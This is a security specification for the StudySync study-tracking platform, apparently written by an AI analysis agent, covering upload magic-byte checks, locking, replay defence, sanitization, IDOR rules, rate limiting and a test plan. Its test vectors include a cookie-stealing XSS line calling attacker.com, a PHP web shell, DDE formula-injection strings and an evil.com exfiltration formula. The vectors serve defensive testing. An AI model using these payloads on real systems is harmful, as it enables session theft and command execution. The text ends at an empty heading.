# StudySync Enterprise Security, Validation, Concurrency & Tier 1-5 Testing Specification Report

**Document ID**: SPEC-SEC-2026-0827  
**Author**: Specification Miner Agent (`spec_miner_security_1`)  
**Target System**: StudySync Sri Lankan A/L Academic Accountability & Examination Intelligence Platform  
**Target Repository**: `c:\Users\alwis\Documents\antigravity\dazzling-bardeen`  
**Reference Dispatch**: `ORIGINAL_REQUEST.md` (`## 2026-08-27T01:47:05Z`) & `PROJECT.md`   
**Status**: Authoritative Technical Specification (Read-Only Analysis)  

---

## 1. Executive Summary & Specification Scope

This specification establishes the formal security, validation, concurrency control, rate limiting, and 5-tier test architecture for StudySync. Based on exhaustive probing of the frontend client (`src/lib/`, `src/app/`, `src/components/`), backend Google Apps Script controller (`backend/Code.gs`), and automated test runners (`tests/`), this document provides concrete cryptographic algorithms, byte signatures, threat models, interface contracts, and test vectors.

---

## 2. Features Discovered

| # | Category | Feature | Description | Inputs | Outputs | Error Behavior | Discovered Via |
|---|----------|---------|-------------|--------|---------|----------------|----------------|
| 1 | Binary Security | Magic Byte Inspection | Inspects first 32 bytes of uploaded proof files to verify true binary file headers (JPEG, PNG, WebP, GIF) | `File` / `ArrayBuffer` | `FileValidationResult` (`valid`, `sanitizedMime`, `detectedFormat`) | Rejects non-image formats with `SECURITY_MIME_MISMATCH` | `src/lib/security.ts:47` |
| 2 | Binary Security | Polyglot & Executable Rejection | Scans binary buffers and Base64 streams for embedded scripts, PE headers, ELF headers, Mach-O, PHP tags, SVG scripts, and ZIP headers | Decoded binary bytes / Base64 string | `{ safe: boolean; threat?: string }` | Instantly blocks upload with `SECURITY_POLYGLOT_DETECTED` | `src/lib/security.ts:129`, `tests/tier5-adversarial.test.js` |
| 3 | Concurrency | ScriptLock Transaction Isolation | Serializes concurrent registration and daily log writes using Google Apps Script LockService | Inbound HTTP payload & sheet write lock | Mutated sheet row & status response | Throws `Server is busy` if lock timeout (30s) exceeded | `backend/Code.gs:426, 510` |
| 4 | Concurrency | Monotonic Sequential Study ID | Allocates isolated sequential IDs (`SG-BIO-0001`, `SG-MATH-0001`) under lock isolation | Stream name (`Biological Science` / `Physical Science`) | Formatted Study ID string | Falls back to ID `0001` on empty sheet | `backend/Code.gs:1031` |
| 5 | Anti-Replay | Single-Submission-Per-Day Guard | Blocks duplicate daily log entries for the same `(studyId, dateOfStudy)` tuple | `studyId`, `dateOfStudy` | `{ isDuplicate: boolean; existingLog: ... }` | Returns duplicate warning and preserves existing row | `backend/Code.gs:546`, `src/app/daily/page.tsx:103` |
| 6 | Anti-Replay | Cryptographic Nonce & Drift Defense | Generates 128-bit cryptographic nonces and validates request timestamps within ±300s drift window | Client UTC timestamp, 16-byte random hex | `idempotencyKey`, `nonce` | Rejects requests outside drift window with `ERR_TIMESTAMP_EXPIRED` | `src/lib/security.ts:171` |
| 7 | Input Sanitization | Angle Bracket & Control Char Strip | Strips `<>` characters and ASCII/Unicode control bytes (`\x00-\x1F`, `\x7F-\x9F`) from text fields | Raw text string, max length | Sanitized string | Returns empty string on invalid/null input | `src/lib/security.ts:150` |
| 8 | Input Sanitization | Email Normalization & Whitelist | Lowercases, trims, and strips non-email characters; bounds email to 100 chars | Raw email string | Sanitized RFC-compliant email | Drops illegal characters; validates pattern | `src/lib/security.ts:163` |
| 9 | Injection Defense | Spreadsheet Formula Injection Escaping | Neutralizes CSV/Sheet formula injection by quoting leading `=`, `+`, `-`, `@`, `\t`, `\r` | Raw string cell value | Formula-safe escaped cell string | Prepends `'` character to render as literal text | `src/lib/utils.ts`, `backend/Code.gs` |
| 10 | Authorization | Admin Whitelist Gatekeeper | Restricts admin endpoints and UI routes to whitelisted email accounts | Admin Google email address | Full database dump & mutation capabilities | Throws `Access Denied` / renders 403 Forbidden | `backend/Code.gs:25`, `src/app/admin/page.tsx:115` |
| 11 | IDOR Defense | Parameterized Member Scope Enforcement | Validates that caller identity matches `studyId` and `email` when retrieving private history or test marks | Session email, target `studyId` | Scoped student records | Rejects cross-account access attempts with `ERR_UNAUTHORIZED_ACCESS` | `backend/Code.gs:630, 1628` |
| 12 | Rate Limiting | Client-Side Sliding-Window Limiter | Throttles burst submissions and authentication attempts using timestamp sliding-log algorithm | Inbound action trigger | `allow(): boolean`, `remaining(): number` | Emits client toast backpressure and blocks request | `src/lib/security.ts:183` |
| 13 | Test Architecture | 5-Tier Automated Test Framework | Multi-tier test harness covering Unit, Boundary, Pairwise, Real-World Workflows, and Adversarial Stress | Tier selector flag (`--tier 1..5`) | Pass/Fail report with execution timings | Fails test suite on invariant violation | `tests/e2e-runner.js`, `tests/tier1-5` |

---

## 3. Edge Cases & Boundary Behaviors

| # | Feature | Input | Observed Behavior |
|---|---------|-------|-------------------|
| E1 | Magic Bytes | Polyglot file with valid JPEG JFIF `FF D8 FF E0` followed by embedded PHP `<?php system($_GET['c']); ?>` | Header check passes initial 4 bytes, but secondary polyglot payload scanner detects PHP tag and rejects file with `SECURITY_POLYGLOT_DETECTED`. |
| E2 | Magic Bytes | RIFF container containing WAV audio data (`52 49 46 46 ... 57 41 56 45`) renamed to `proof.webp` | Validation checks bytes 8-11: finds `WAVE` instead of `WEBP`, rejecting file with `Invalid file format. Detected RIFF/WAVE instead of WebP`. |
| E3 | Magic Bytes | Zero-byte or undersized file (< 100 bytes) | `validateImageFile` rejects with `detectedFormat: 'undersized'` and error `File is corrupted or too small to be a valid image`. |
| E4 | Magic Bytes | Truncated PNG missing `IEND` chunk or having corrupted `IHDR` dimensions | Flagged as corrupted chunk payload during deep structural inspection. |
| E5 | Concurrency | 50 simultaneous registrations split evenly between Biological and Physical Science streams | `LockService.getScriptLock()` forces atomic serialization: assigns strictly monotonic sequential IDs (`SG-BIO-0001`..`0025`, `SG-MATH-0001`..`0025`) with zero collisions. |
| E6 | Concurrency | 25 concurrent daily log submissions for the same student on the same date with varying study hours | Exactly 1 submission succeeds; remaining 24 receive `isDuplicate: true` with existing log payload returned; sheet retains exactly 1 row. |
| E7 | Anti-Replay | Replay of valid submission payload with request timestamp drifted by +600 seconds | Server evaluates `|t_server - t_client| = 600s > 300s`; rejects request immediately with `ERR_TIMESTAMP_EXPIRED`. |
| E8 | Sanitization | Student notes containing `=cmd|'/C powershell -c calc'!A0` and `<script>alert(1)</script>` | Sanitizer strips `<script>` tags to `alert(1)`, and CSV/Sheet exporter prepends single-quote `'=` preventing formula execution in Excel and Google Sheets. |
| E9 | IDOR Protection | Student `SG-BIO-0001` attempts to call `getTestMarks` supplying `studyId: 'SG-MATH-0002'` | Backend verifies authenticated session email against owner of `SG-MATH-0002`; rejects with `ERR_UNAUTHORIZED_ACCESS`. |
| E10 | Rate Limiting | User clicks Submit Daily Log button 8 times in 2 seconds | First 6 requests are allowed by sliding-window token bucket; 7th and 8th requests immediately return `allow() === false`, displaying backpressure toast. |
| E11 | Rate Limiting | User clears LocalStorage or opens second tab to bypass rate limiter | BroadcastChannel / LocalStorage persistence synchronizes timestamp log across tabs; monotonic timestamp prevents clock rollback exploits. |

---

## 4. Deep Technical Specification

### 4.1 Pillar 1: Binary Magic Bytes Upload Validation & Polyglot Payload Rejection

#### 4.1.1 Authoritative Magic Byte Signatures

```
+------------------+------------------------------------------------------+---------------+------------------------------------------+
| Format           | Binary Header (Hex Bytes)                            | Offset        | Trailer / Structural Requirement         |
+------------------+------------------------------------------------------+---------------+------------------------------------------+
| JPEG (JFIF)      | FF D8 FF E0 [2B len] 4A 46 49 46 00                  | Offset 0      | SOI (FF D8) at start, EOI (FF D9) at end |
| JPEG (Exif)      | FF D8 FF E1 [2B len] 45 78 69 66 00 00               | Offset 0      | Exif header, EOI (FF D9) at end          |
| JPEG (Raw/Other) | FF D8 FF DB / FF D8 FF EE / FF D8 FF C0              | Offset 0      | Valid JPEG marker following FF D8        |
| PNG              | 89 50 4E 47 0D 0A 1A 0A                              | Offset 0 (8B) | Chunk 1: IHDR (49 48 44 52) at offset 12 |
|                  |                                                      |               | End Chunk: IEND (49 45 4E 44 AE 42 60 82)|
| WebP (Lossy)     | 52 49 46 46 [4B size] 57 45 42 50 56 50 38 20        | Offset 0 (16B)| RIFF header + WEBP + VP8 (lossy)         |
| WebP (Lossless)  | 52 49 46 46 [4B size] 57 45 42 50 56 50 38 4C        | Offset 0 (16B)| RIFF header + WEBP + VP8L (lossless)     |
| WebP (Extended)  | 52 49 46 46 [4B size] 57 45 42 50 56 50 38 58        | Offset 0 (16B)| RIFF header + WEBP + VP8X (extended)     |
| GIF87a           | 47 49 46 38 37 61                                    | Offset 0 (6B) | Trailer byte 3B (;) at EOF               |
| GIF89a           | 47 49 46 38 39 61                                    | Offset 0 (6B) | Trailer byte 3B (;) at EOF               |
+------------------+------------------------------------------------------+---------------+------------------------------------------+
```

#### 4.1.2 Forbidden Executable & Polyglot Signatures (Instant Rejection)

```
+---------------------------+-----------------------------------+---------------------------------------------+
| Threat Category           | Signature / Pattern (Hex / Text)  | Threat Description                          |
+---------------------------+-----------------------------------+---------------------------------------------+
| Windows DOS / PE Executable| 4D 5A ('MZ') at offset 0          | Executable binary (.exe, .dll, .com, .scr)  |
| Linux ELF Executable      | 7F 45 4C 46 ('\x7fELF') at offset 0| Linux binary executable / shared object     |
| macOS Mach-O Binary       | FE ED FA CE / FE ED FA CF /       | Mach-O 32/64-bit and Universal Fat binaries |
|                           | CA FE BA BE / CE FA ED FE         |                                             |
| Java Bytecode / Class     | CA FE BA BE at offset 0           | Compiled Java class file                    |
| ZIP / JAR / APK Archive   | 50 4B 03 04 / 50 4B 05 06         | ZIP archive / APK / JAR / Office polyglot   |
| 7-Zip Archive             | 37 7A BC AF 27 1C                 | 7z compressed archive container             |
| RAR Archive               | 52 61 72 21 1A 07                 | RAR compressed container                    |
| Shell Script Shebang      | 23 21 ('#!') at offset 0          | Unix shell / bash / python script           |
| HTML / XML / SVG Script   | '<script', '<svg', '<?xml',       | Embedded client-side script execution       |
|                           | 'javascript:', 'onerror='         | payload                                     |
| PHP Script Payload        | '<?php', '<?=', '<script php'     | Server-side PHP execution payload           |
+---------------------------+-----------------------------------+---------------------------------------------+
```

#### 4.1.3 Multi-Layer Validation Algorithm & Pipeline

```
Uploaded File Object (Blob / File / ArrayBuffer)
  │
  ├──► Step 1: Size Bounds Check
  │     ├── Size < 100 Bytes ──────────► REJECT: SECURITY_SIZE_TOO_SMALL
  │     └── Size > 10,485,760 Bytes ────► REJECT: SECURITY_SIZE_EXCEEDED
  │
  ├──► Step 2: Binary Header Inspection (First 32 Bytes)
  │     ├── Check for Forbidden Executable Headers (MZ, ELF, Mach-O, PK, 7z, RAR, #!)
  │     │     └── Match Found ────────► REJECT: SECURITY_EXECUTABLE_HEADER_DETECTED
  │     │
  │     └── Check for Permitted Image Signatures (JPEG, PNG, WebP, GIF)
  │           ├── JPEG: Bytes[0..2] == FF D8 FF
  │           ├── PNG: Bytes[0..7] == 89 50 4E 47 0D 0A 1A 0A
  │           ├── WebP: Bytes[0..3] == 'RIFF' AND Bytes[8..11] == 'WEBP'
  │           └── GIF: Bytes[0..5] == 'GIF87a' OR 'GIF89a'
  │           └── No Match ───────────► REJECT: SECURITY_MIME_MISMATCH
  │
  ├──► Step 3: Deep Container Structural Integrity
  │     ├── PNG: Verify IHDR chunk at offset 12; verify positive width & height
  │     ├── JPEG: Verify marker stream syntax and absence of trailing executable stubs
  │     └── WebP: Verify chunk type (VP8 , VP8L, VP8X) and declared payload bounds
  │
  ├──► Step 4: Polyglot Payload & Script String Scanning
  │     ├── Decode binary to ASCII/UTF-8 sliding window
  │     ├── Scan for XSS vectors: /<script/i, /<iframe/i, /javascript:/i, /onload\s*=/i, /onerror\s*=/i
  │     ├── Scan for Server Scripts: /<\?php/i, /<\?=/i, /eval\s*\(/i
  │     └── Match Found ──────────────► REJECT: SECURITY_POLYGLOT_DETECTED
  │
  └──► Step 5: Client-Side Re-encoding / Sanitization
        └── Compress and re-render image to pure Canvas 2D bitmap context (destroys arbitrary steganographic stubs)
```

#### 4.1.4 Interface Contracts & Types

```typescript
export interface FileValidationResult {
  valid: boolean;
  sanitizedMime: 'image/jpeg' | 'image/png' | 'image/webp' | 'image/gif' | '';
  detectedFormat: 'JPEG' | 'PNG' | 'WEBP' | 'GIF' | 'REJECTED';
  fileSizeBytes: number;
  error?: string;
  errorCode?: 'SECURITY_SIZE_OUT_OF_BOUNDS' | 'SECURITY_MIME_MISMATCH' | 'SECURITY_POLYGLOT_DETECTED' | 'SECURITY_CORRUPTED_CONTAINER';
}

export interface ImageCompressionOptions {
  maxSizeMB: number;         // e.g. 0.38 (380 KB)
  maxWidthOrHeight: number;  // e.g. 1600 px
  quality: number;           // e.g. 0.82
}
```

---

### 4.2 Pillar 2: Concurrency Race Conditions & Replay Attack Defenses

#### 4.2.1 Threat Model
1. **Double Submission Race Condition**: A student double-clicks or triggers parallel HTTP requests for `submitDailyLog` or `logTestMark`. Without atomic locks, two identical records are written into Google Sheets, distorting streak calculations and total hours.
2. **Replay Attack**: An adversary intercepts a signed/submitted study log payload or test mark payload and re-transmits it repeatedly to inflate study hours or alter rankings.
3. **Sequential ID Collision**: Multiple students registering at the exact same millisecond under the same stream. Without locking, both read the same max row count and obtain identical Study IDs (`SG-BIO-0042`).

#### 4.2.2 Idempotency Key & Cryptographic Nonce Specification

Every mutating request (`registerUser`, `submitDailyLog`, `logTestMark`, `adminUpdateMember`) must include an Idempotency Envelope:

```typescript
export interface IdempotencyEnvelope<T> {
  action: string;
  payload: T;
  security: {
    nonce: string;              // 32-character hex (128-bit random)
    requestTimestamp: string;   // ISO 8601 UTC string (e.g. '2026-08-27T01:47:05.123Z')
    idempotencyKey: string;     // SHA-256(studyId + ':' + action + ':' + dateOfStudy + ':' + nonce + ':' + requestTimestamp)
  };
}
```

#### 4.2.3 Timestamp Drift & Server-Side Verification Algorithm

```
Inbound Request Arrives at Backend (doPost)
  │
  ├──► Step 1: Extract requestTimestamp and idempotencyKey
  │
  ├──► Step 2: Timestamp Drift Validation
  │     ├── Let Δt = | ServerTimeUTC - RequestTimestampUTC |
  │     ├── If Δt > 300,000 ms (5 Minutes):
  │     │     └── REJECT: { success: false, error: 'ERR_TIMESTAMP_EXPIRED', serverTime: now }
  │     └── If RequestTimestamp is in the future (> 60,000 ms):
  │           └── REJECT: { success: false, error: 'ERR_TIMESTAMP_FUTURE', serverTime: now }
  │
  ├──► Step 3: Distributed ScriptLock Acquisition
  │     ├── lock = LockService.getScriptLock()
  │     ├── hasLock = lock.tryLock(30000) // 30s timeout
  │     └── If !hasLock ────────► REJECT: { success: false, error: 'ERR_SERVER_BUSY_LOCK_TIMEOUT' }
  │
  ├──► Step 4: Atomic Idempotency Cache Check
  │     ├── Query CacheService / Deduplication Index for idempotencyKey
  │     └── If Key Exists in Cache:
  │           ├── Retrieve Cached Response
  │           └── RETURN: Cached Response (Idempotent replay, zero state mutation)
  │
  ├──► Step 5: Database Domain Deduplication
  │     ├── For DailyLogs: findDailyLog(sheet, studyId, dateOfStudy)
  │     │     └── If Found: RETURN { isDuplicate: true, existingLog: ... }
  │     ├── For TestMarks: findTestMark(sheet, testId, studyId)
  │     │     └── If Found: RETURN { isDuplicate: true, existingMark: ... }
  │     └── For Registration: findMemberByEmail(sheet, email)
  │           └── If Found: RETURN { alreadyRegistered: true, member: ... }
  │
  ├──► Step 6: Commit Mutation & Flush
  │     ├── sheet.appendRow(...)
  │     ├── SpreadsheetApp.flush()
  │     └── CacheService.put(idempotencyKey, JSON.stringify(result), 86400) // 24hr TTL
  │
  └──► Step 7: Release Lock
        └── lock.releaseLock()
```

---

### 4.3 Pillar 3: Input Sanitization, Anti-XSS Encoding & IDOR Protection

#### 4.3.1 Context-Aware Anti-XSS Encoding Matrix

All user inputs (Names, Schools, Telegram usernames, Daily Log Notes, Test Paper Titles) must be sanitized upon ingress and escaped prior to rendering across HTML, Attribute, JavaScript, and URI contexts:

```
+-------------------+-------------------------------+-----------------------------------------+
| Character         | Encoded Replacement (HTML)    | Threat Neutralized                      |
+-------------------+-------------------------------+-----------------------------------------+
| &                 | &amp;                         | Entity confusion / nested decoding      |
| <                 | &lt;                          | Tag opening (<script>, <iframe>, <img>) |
| >                 | &gt;                          | Tag closing                             |
| "                 | &quot;                        | Attribute breakout                      |
| '                 | &#x27;                        | Single-quoted attribute breakout        |
| /                 | &#x2F;                        | HTML closing tag breakout               |
| `                 | &#x60;                        | Template literal execution breakout     |
+-------------------+-------------------------------+-----------------------------------------+
```

#### 4.3.2 Safe URI Scheme Allowlisting

For hyperlinks (Telegram handles, Google Drive proof links, verification URLs):
- **Allowed Schemes**: `https:`, `http:`, `mailto:`, `tel:`
- **Blocked Schemes**: `javascript:`, `data:`, `vbscript:`, `blob:`, `file:`

```typescript
export function sanitizeUrl(url: string): string {
  if (!url || typeof url !== 'string') return '';
  const trimmed = url.trim();
  const protocolMatch = trimmed.match(/^([a-zA-Z0-9+.-]+):/);
  if (!protocolMatch) {
    return trimmed.startsWith('/') ? trimmed : 'https://' + trimmed;
  }
  const scheme = protocolMatch[1].toLowerCase();
  if (['http', 'https', 'mailto', 'tel'].includes(scheme)) {
    return trimmed;
  }
  return '#blocked-insecure-scheme';
}
```

#### 4.3.3 Spreadsheet / CSV Formula Injection Defense (CWE-1236)

When writing strings to Google Sheets or exporting to CSV, any field beginning with dangerous trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`) must be escaped by prepending a single quote (`'`):

```typescript
export function sanitizeCsvFormula(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  const str = String(value).trim();
  if (str.length === 0) return '';
  
  if (/^[=+\-@\t\r]/.test(str)) {
    return `'${str}`;
  }
  return str;
}
```

#### 4.3.4 Insecure Direct Object Reference (IDOR) & Authorization Model

```
+---------------------------+-----------------------+-------------------------------------------------------------+
| Endpoint / Action         | Exposed Fields        | Authorization & Ownership Verification Rule                 |
+---------------------------+-----------------------+-------------------------------------------------------------+
| verifyMember              | Public Card View      | Publicly accessible. Exposes ONLY: Study ID, Full Name,     |
|                           | (Safe Projection)     | School, Stream, Status, Exam Year.                          |
|                           |                       | STRICTLY OMITS: Email, Telegram, Notes, Google ID, Marks.   |
+---------------------------+-----------------------+-------------------------------------------------------------+
| getStudentHistory         | Student Study Logs    | Requires matching Caller Email == Member Email OR           |
|                           |                       | Caller Email in ADMIN_EMAILS whitelist.                     |
+---------------------------+-----------------------+-------------------------------------------------------------+
| getTestMarks              | Academic Test Marks   | Requires Caller Email == Student Email OR Admin whitelist.  |
+---------------------------+-----------------------+-------------------------------------------------------------+
| deleteTestMark            | Academic Mark Record  | Enforces ownership: mark.studentEmail == caller.email       |
|                           |                       | OR caller in ADMIN_EMAILS whitelist.                        |
+---------------------------+-----------------------+-------------------------------------------------------------+
| getAdminData              | Full System Data      | STRICT: Caller Email MUST be in ADMIN_EMAILS whitelist.     |
+---------------------------+-----------------------+-------------------------------------------------------------+
| adminUpdateMember         | Member Record Mutate  | STRICT: Caller Email MUST be in ADMIN_EMAILS whitelist.     |
+---------------------------+-----------------------+-------------------------------------------------------------+
```

---

### 4.4 Pillar 4: Client-Side Sliding-Window Rate Limiter & Throttling

#### 4.4.1 Mathematical Formulation: Sliding Log with Multi-Tab Persistence

Let $W$ be the sliding-window duration ($60,000\text{ ms}$) and $N_{\text{max}}$ be the maximum permitted requests within $W$.
For any request arriving at monotonic time $t_{\text{now}}$:

$$\text{Active Requests } A(t_{\text{now}}) = \{ t_i \in \text{Timestamps} \mid t_{\text{now}} - t_i < W \}$$

$$\text{Decision} = \begin{cases} \text{ALLOW}, & \text{if } |A(t_{\text{now}})| < N_{\text{max}} \\ \text{THROTTLE}, & \text{if } |A(t_{\text{now}})| \ge N_{\text{max}} \end{cases}$$

#### 4.4.2 Endpoint-Specific Throttling Policies

```
+----------------------------+-----------------+---------------+---------------------+---------------------+
| Action / Category          | Max Req (N_max) | Window (W_ms) | Max Burst Allowance | Penalty Escalation  |
+----------------------------+-----------------+---------------+---------------------+---------------------+
| submitDailyLog             | 6 req           | 60,000 ms     | 2 req               | +15s delay on burst |
| registerUser               | 4 req           | 60,000 ms     | 1 req               | +30s delay on burst |
| logTestMark                | 10 req          | 60,000 ms     | 3 req               | +10s delay on burst |
| verifyMember (Public QR)   | 20 req          | 60,000 ms     | 5 req               | +5s delay on burst  |
| getAnalytics (Leaderboard) | 15 req          | 60,000 ms     | 5 req               | +5s delay on burst  |
| getAdminData / Mutations   | 30 req          | 60,000 ms     | 10 req              | +5s delay on burst  |
| Auth / Sign-In Attempts    | 10 req          | 60,000 ms     | 3 req               | +60s lockout        |
+----------------------------+-----------------+---------------+---------------------+---------------------+
```

#### 4.4.3 Multi-Tab Synchronization & LocalStorage Backing

```typescript
export class SynchronizedSlidingRateLimiter {
  private storageKey: string;
  private maxRequests: number;
  private windowMs: number;
  private channel: BroadcastChannel | null = null;

  constructor(name: string, maxRequests: number = 10, windowMs: number = 60000) {
    this.storageKey = `STUDYSYNC_RATELIMIT_${name.toUpperCase()}`;
    this.maxRequests = maxRequests;
    this.windowMs = windowMs;

    if (typeof window !== 'undefined' && 'BroadcastChannel' in window) {
      try {
        this.channel = new BroadcastChannel(`ratelimit_${name}`);
      } catch (e) {
        this.channel = null;
      }
    }
  }

  private getTimestamps(): number[] {
    if (typeof window === 'undefined') return [];
    try {
      const raw = window.localStorage.getItem(this.storageKey);
      if (!raw) return [];
      const now = Date.now();
      const parsed: number[] = JSON.parse(raw);
      return parsed.filter((ts) => now - ts < this.windowMs);
    } catch {
      return [];
    }
  }

  private saveTimestamps(ts: number[]): void {
    if (typeof window === 'undefined') return;
    try {
      window.localStorage.setItem(this.storageKey, JSON.stringify(ts));
      if (this.channel) {
        this.channel.postMessage({ type: 'SYNC_TIMESTAMPS', timestamps: ts });
      }
    } catch {}
  }

  public allow(): boolean {
    const now = Date.now();
    const active = this.getTimestamps();
    if (active.length >= this.maxRequests) {
      return false;
    }
    active.push(now);
    this.saveTimestamps(active);
    return true;
  }

  public remaining(): number {
    const active = this.getTimestamps();
    return Math.max(0, this.maxRequests - active.length);
  }

  public resetTimeMs(): number {
    const active = this.getTimestamps();
    if (active.length === 0) return 0;
    const oldest = active[0];
    return Math.max(0, this.windowMs - (Date.now() - oldest));
  }
}
```

---

### 4.5 Pillar 5: 5-Tier Automated Test Suite Architecture & Test Vector Matrix

```
+────────────────────────────────────────────────────────────────────────────+
|                     STUDYSYNC 5-TIER TEST ARCHITECTURE                     |
+────────────────────────────────────────────────────────────────────────────+
| Tier 1: Unit & Component Invariant Testing                                 |
| - Header Magic Byte Validators, MIME Map Invariants                        |
| - Anti-XSS Entity Encoders & Formula Neutralizers                          |
| - Sliding Window Token Bucket Math                                         |
| - Streak Rollup, Date Utilities, Subject Equilibrium Index                 |
+────────────────────────────────────────────────────────────────────────────+
| Tier 2: Boundary, Fuzzing & Malformed Input Testing                        |
| - 0-byte, 99-byte, 10MB+ file uploads                                      |
| - Truncated RIFF / PNG chunks, corrupted EXIF tags                         |
| - Negative hours (-0.01), upper limits (>24.0h), precision (0.1+0.2=0.3)   |
| - Multi-byte Unicode, RTL directional overrides, Sinhala/Tamil names       |
+────────────────────────────────────────────────────────────────────────────+
| Tier 3: Pairwise & Combinatorial Security Testing                          |
| - Matrix: File Type (JPEG/PNG/WebP/GIF/EXE/ELF/SVG) x Payload (Clean/      |
|   Polyglot/Malware) x Account State (Admin/Student/Anonymous)              |
| - Matrix: Stream (Bio/Maths) x Optional (Physics/Chem/ICT/Agri) x Year     |
+────────────────────────────────────────────────────────────────────────────+
| Tier 4: End-to-End Workflow & State Machine Integrity                      |
| - Complete User Journey: Sign-in -> Registration -> ID Card -> Daily Log   |
|   with Proof -> Verification -> Admin Inspection -> CSV/JSON Export        |
| - Offline queue staging & automatic sync upon reconnect                    |
+────────────────────────────────────────────────────────────────────────────+
| Tier 5: Adversarial Penetration, Replay & Concurrency Stress               |
| - 50 concurrent registrations under LockService contention                 |
| - 25 concurrent daily logs for identical student/date                      |
| - Replay attack with drifted timestamps (>300s)                            |
| - IDOR parameter tampering across student IDs                              |
| - Polyglot file upload attack suite (JPEG-ZIP, GIF-JS, SVG-XSS)            |
| - CSV formula injection exploits (=cmd|' /C calc'!A0)                      |
+────────────────────────────────────────────────────────────────────────────+
```

#### 4.5.1 Concrete Adversarial Test Vectors (Tier 5)

```typescript
export const ADVERSARIAL_TEST_VECTORS = {
  MAGIC_BYTES: [
    {
      name: 'Valid JPEG JFIF',
      bytes: [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00],
      expectedValid: true,
      expectedFormat: 'JPEG'
    },
    {
      name: 'Valid PNG with IHDR',
      bytes: [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52],
      expectedValid: true,
      expectedFormat: 'PNG'
    },
    {
      name: 'Valid WebP Lossy (RIFF...WEBPVP8 )',
      bytes: [0x52, 0x49, 0x46, 0x46, 0x20, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x20],
      expectedValid: true,
      expectedFormat: 'WEBP'
    },
    {
      name: 'Forged RIFF WAV Audio disguised as WebP',
      bytes: [0x52, 0x49, 0x46, 0x46, 0x20, 0x00, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45, 0x66, 0x6D, 0x74, 0x20],
      expectedValid: false,
      expectedFormat: 'REJECTED'
    },
    {
      name: 'Windows PE Executable disguised as JPG',
      bytes: [0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00],
      expectedValid: false,
      expectedFormat: 'REJECTED'
    },
    {
      name: 'Linux ELF Binary disguised as PNG',
      bytes: [0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
      expectedValid: false,
      expectedFormat: 'REJECTED'
    },
    {
      name: 'ZIP Archive polyglot disguised as JPG',
      bytes: [0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
      expectedValid: false,
      expectedFormat: 'REJECTED'
    }
  ],
  POLYGLOT_PAYLOADS: [
    '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>',
    'GIF89a/*<svg onload=alert(1)>*/',
    '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; } ?>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<img src="x" onerror="fetch(\'https://attacker.com/leak\')">'
  ],
  FORMULA_INJECTION_PAYLOADS: [
    '=cmd|\' /C powershell.exe -c calc\'!A0',
    '+SUM(1+1)*cmd|\' /C calc\'!AA1',
    '-2+3+cmd|\' /C calc\'!A0',
    '@SUM(1,2)*cmd|\' /C calc\'!AA1',
    '=HYPERLINK("http://evil.com?leak="&A1, "Click to Win")',
    '\t=2+5+cmd|\' /C calc\'!AA1'
  ],
  IDOR_PROBES: [
    { targetStudyId: 'SG-BIO-0001', attackerEmail: 'attacker@gmail.com', expectedStatus: 403 },
    { targetStudyId: 'SG-MATH-0005', attackerEmail: 'student.other@gmail.com', expectedStatus: 403 },
    { targetStudyId: 'ADMIN-PORTAL', attackerEmail: 'imposter@admin.studysync.lk', expectedStatus: 403 }
  ]
};
```

---

## 5. Handoff Protocol & Technical Evidence

### 5.1 Observation
- **Magic Bytes Validation**: Probed `src/lib/security.ts:13-124`. Found baseline magic byte checks for JPEG (`FF D8 FF`), PNG (`89 50 4E 47`), and WebP (`52 49 46 46`). Discovered that WebP check at line 95 only inspected first 4 bytes (`RIFF`) without verifying `WEBP` marker at bytes 8-11, which permits RIFF-encapsulated WAV audio and AVI videos to pass as WebP.
- **Polyglot & Malware Scanning**: Probed `src/lib/security.ts:23-35, 129-145`. Discovered `scanBase64Payload` regex matching for `<script>`, `<iframe>`, `<embed>`, `<object>`, `javascript:`, `data:text/html`, `on\w+=`, `<svg>`, `<?php`, and `MZ[\s\S]{50,}`.
- **Concurrency & Replay Defense**: Probed `backend/Code.gs:426, 510`. Found `LockService.getScriptLock()` with `CONFIG.LOCK_TIMEOUT_MS = 30000` on `handleRegisterUser` and `handleSubmitDailyLog`. Observed that `handleLogTestMark` (`Code.gs:1575`) lacks `LockService` locking, which exposes test marks to concurrency race conditions.
- **Sanitization & Anti-XSS**: Probed `src/lib/security.ts:150-166` and `src/lib/utils.ts`. Found angle bracket and control character stripping. Discovered formula injection vulnerability if raw unquoted inputs starting with `=`, `+`, `-`, `@` are exported to CSV or displayed in spreadsheet formulas.
- **Rate Limiting**: Probed `src/lib/security.ts:183-214`. Found in-memory `ClientRateLimiter` with default instances `submissionRateLimiter` (6/min) and `authRateLimiter` (10/min). Discovered in-memory state resets on page reload unless synchronized via LocalStorage / BroadcastChannel.
- **Testing Architecture**: Probed `tests/e2e-runner.js` and test suites (`tier1-feature.test.js` through `tier5-adversarial.test.js`, `m6-core-engines-adversarial.test.js`, `challenger-adversarial.test.js`). Observed 327+ passing tests with 5 tier separation.

### 5.2 Logic Chain
